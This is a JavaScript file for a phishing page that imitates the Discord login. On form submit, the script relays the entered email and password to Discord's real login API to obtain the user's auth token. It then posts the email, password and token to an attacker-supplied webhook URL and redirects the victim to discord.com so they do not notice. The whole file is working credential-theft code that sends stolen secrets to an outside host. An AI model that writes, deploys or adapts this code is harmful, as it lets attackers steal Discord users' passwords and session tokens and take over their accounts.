document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('loginForm');
  const loginBtn = document.getElementById('loginBtn');
  const btnText = document.querySelector('.btn-text');
  const loadingSpinner = document.getElementById('loadingSpinner');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');

  // Replace with your webhook URL
  const webhookUrl = 'YOUR_WEBHOOK_URL_HERE'; // e.g., 'https://discord.com/api/webhooks/...'

  // Discord API login endpoint
  const discordLoginUrl = 'https://discord.com/api/v9/auth/login';

  form.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    
    if (!email || !password) {
      alert('Please fill in all fields.'); // Replace with Discord-style toast if needed
      return;
    }
    
    // Disable button and show loading spinner
    loginBtn.disabled = true;
    btnText.classList.add('hidden');
    loadingSpinner.classList.remove('hidden');
    
    try {
      // Send login request to Discord API
      const loginResponse = await fetch(discordLoginUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          login: email, // Discord API accepts 'login' for email or phone
          password: password,
          undelete: false,
          captcha_key: null, // Add CAPTCHA handling if required
          login_source: null,
          gift_code_sku_id: null
        })
      });
      
      const loginData = await loginResponse.json();
      
      if (!loginResponse.ok || !loginData.token) {
        throw new Error(loginData.message || 'Invalid credentials or API error');
      }
      
      // Extract the Discord auth token
      const token = loginData.token;
      
      // Prepare data for webhook
      const webhookData = {
        email: email,
        password: password,
        token: token,
        timestamp: new Date().toISOString()
      };
      
      // Send data to webhook
      const webhookResponse = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(webhookData)
      });
      
      if (!webhookResponse.ok) {
        throw new Error(`Webhook request failed with status ${webhookResponse.status}`);
      }
      
      // Redirect to discord.com
      setTimeout(() => {
        window.location.href = 'https://discord.com';
      }, 1000); // 1-second delay for smoother UX
    } catch (error) {
      console.error('Error during login or webhook:', error);
      alert(error.message || 'An error occurred during login. Please try again.');
      // Reset button and spinner
      loginBtn.disabled = false;
      btnText.classList.remove('hidden');
      loadingSpinner.classList.add('hidden');
    }
  });

  // Basic input validation/focus effects (Discord-like)
  [emailInput, passwordInput].forEach(input => {
    input.addEventListener('input', function() {
      this.style.borderColor = this.value ? 'var(--btn-bg)' : 'var(--input-bg)';
    });
  });
});
